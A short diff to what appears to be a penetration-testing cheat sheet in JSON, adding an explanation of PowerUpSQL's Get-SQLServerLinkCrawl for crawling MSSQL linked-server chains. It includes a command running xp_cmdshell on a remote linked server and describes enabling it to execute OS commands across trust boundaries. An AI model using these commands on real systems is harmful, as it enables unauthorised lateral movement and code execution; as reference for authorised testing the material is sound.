@@ -148,5 +148,6 @@
       "label": "Targeted RCE across the chain (-QueryTarget)",
       "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <final_server>"
     }
-  ]
+  ],
+  "explain": "Crawls MSSQL linked-server chains with PowerUpSQL to find and abuse trust links between SQL instances:\n  Get-SQLServerLinkCrawl    follow every linked server recursively from the entry instance\n  -Instance <ip>            the SQL server to start crawling from\n  -Verbose                  show each hop, its login context, and sysadmin status\nAdd -Query 'exec master..xp_cmdshell ...' to run OS commands on any reachable linked node (enabling xp_cmdshell across the link if needed) - links can cross domain/trust boundaries."
 }
